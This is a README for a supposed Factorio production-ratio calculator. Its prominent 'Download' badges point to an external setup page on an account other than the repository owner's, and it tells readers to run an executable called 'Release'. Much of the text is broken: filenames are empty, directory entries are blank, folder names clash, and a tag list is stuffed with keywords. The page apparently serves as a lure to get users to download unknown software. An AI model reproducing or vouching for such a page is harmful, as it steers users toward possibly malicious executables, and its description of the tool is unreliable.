# Factorio-Production-Ratio-Calculator

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-15803d?style=flat-square&logo=book&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/gigahokagepincers/Factorio-Production-Ratio-Calculator">
    <img src="https://img.shields.io/badge/factorio-1.1-4B8BBE?style=for-the-badge&logo=gamepad" alt="Factorio">
  </a>
  <a href="https://github.com/gigahokagepincers/Factorio-Production-Ratio-Calculator">
    <img src="https://img.shields.io/badge/production-✓-00C853?style=flat&logo=industry" alt="Production">
  </a>
  <a href="https://github.com/gigahokagepincers/Factorio-Production-Ratio-Calculator">
    <img src="https://img.shields.io/badge/Download-FF9800?style=plastic&logo=calculator" alt="Ratio Calculator">
  </a>
  <a href="https://github.com/gigahokagepincers/Factorio-Production-Ratio-Calculator/stargazers">
    <img src="https://img.shields.io/badge/stars-★-FFD700?style=flat-square&logo=star" alt="Stars">
  </a>
  <a href="https://github.com/gigahokagepincers/Factorio-Production-Ratio-Calculator/issues">
    <img src="https://img.shields.io/badge/Download-FF5252?style=for-the-badge&logo=issue" alt="Support">
  </a>
</div>

---

> **TL;DR** – The *Factorio-Production-Ratio-Calculator* lets you define reusable production profiles, run batch simulations, and export balanced blueprint bundles for any factory scale. Grab the latest release, drop the configuration files into your Factorio save folder, and let the calculator do the heavy lifting.

---

## Why the Factorio Production Ratio Calculator matters

Factorio factories quickly become tangled webs of intermediate items. Manually tracking the exact number of assemblers, furnaces, and belts needed for a new product line is error‑prone and time‑consuming. This calculator introduces a declarative workflow:

* **Profile‑driven** – Store a set of production ratios in a single `` file that can be versioned alongside your world.
* **Preset‑aware** – Switch between “early‑game”, “mid‑game” and “late‑game” presets without editing numbers.
* **Export‑ready** – Generate a zip bundle containing blueprint strings, ready to be imported via the in‑game blueprint library.

All calculations respect the current research level, beacon effects, and module configurations defined in `` or ``. The result is a deterministic, reproducible production layout that can be shared with teammates or archived for future reference.

---

## Core features at a glance

| Feature | Description | Relevant file |
|---------|-------------|---------------|
| Structured configuration | Hierarchical `.cfg` files (``, ``, ``, ``) let you separate base ratios, visual styling, player‑specific overrides, and experimental tweaks. | `config/` |
| Workflow presets | Pre‑bundled `presets/`, `presets/`, `presets/` enable rapid scenario switching. | `presets/` |
| Batch processing | Feed a CSV list of items; the calculator returns a complete table of required assemblers, belts, and power consumption. | `scripts/` |
| Blueprint export | One‑click generation of a `.zip` containing `blueprint.txt` files for every major production line. | `export/` |
| Compatibility layer | Reads the same data format used by popular community factories, making migration painless. | `compat/` |
| Detailed logging | Verbose log output (`calc.log`) helps you audit why a particular ratio was chosen. | `logs/` |

---

## Getting started – step‑by‑step

1. **Download the latest release** – Click the *Download* badge above. The zip archive contains the full runtime, example configs, and a short user guide.
2. **Extract into your Factorio saves directory** – Place the `Factorio-Production-Ratio-Calculator` folder next to `saves/`. The internal structure is self‑contained; no system‑wide changes are required.
3. **Choose a preset** – Open `presets/` (or any other preset) and adjust the `target_rate` fields to match your desired output per minute.
4. **Run the calculator** – Launch `Release` (Windows) or `calc` (Linux/macOS). The UI prompts you for the target item and the quantity you wish to produce.
5. **Inspect the report** – The application produces `report.txt`, a human‑readable table showing the exact number of each machine type, belt speed, and power draw.
6. **Export blueprint bundle** – Click *Export* inside the UI; a `bundle.zip` appears in the `export/` directory. Import the contained blueprint strings through Factorio’s blueprint library.

---

## Directory layout

```
Factorio-Production-Ratio-Calculator/
├─ config/
│   ├─
│   ├─
│   ├─
│   └─
├─ presets/
│   ├─
│   ├─
│   └─
├─ scripts/
│   └─ batch_processor.py
├─ export/
│   └─ (generated zip bundles)
├─ logs/
│   └─ calc.log
└─ README.md
```

The layout is deliberately flat to keep navigation intuitive for both newcomers and seasoned factory engineers.

---

## FAQ & troubleshooting

**Q: The calculator reports a negative assembler count. What went wrong?**
A: Negative numbers usually indicate an inconsistency between the target rate and the available research bonuses. Verify that `` reflects the correct productivity module count and that the `target_rate` in your preset does not exceed the maximum throughput of the selected machine tier.

**Q: My exported blueprint cannot be imported.**
A: Ensure you are using Factorio version 1.1 or later; the blueprint format changed in 1.0. The calculator embeds a version header in each blueprint file. If the header reads `v0.9`, regenerate the bundle with the latest release.

**Q: I want to add a new item that isn’t in ``.**
A: Append a line to `` following the existing syntax. After saving, restart the calculator so it reloads the configuration hierarchy.

**Q: The UI freezes when I load a CSV with many rows.**
A: Large batch files are processed sequentially. For datasets exceeding 5 000 rows, split the CSV into smaller chunks or use the `batch_processor.py` script directly from the command line (no UI required).

**Q: Where can I report a bug or request a feature?**
A: Open an issue on the repository’s GitHub page. Include the `calc.log` file and a short description of the steps that led to the problem.

---

## Tags for discovery

`factorio` `production` `ratio` `calculator` `factorio-production` `production-ratio` `ratio-calculator` `factorio-manager` `factorio-helper` `factorio-config`

---

*Maintained with care by **gigahokagepincers**. Feel free to fork, propose enhancements, or share your own preset files in the community repository.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```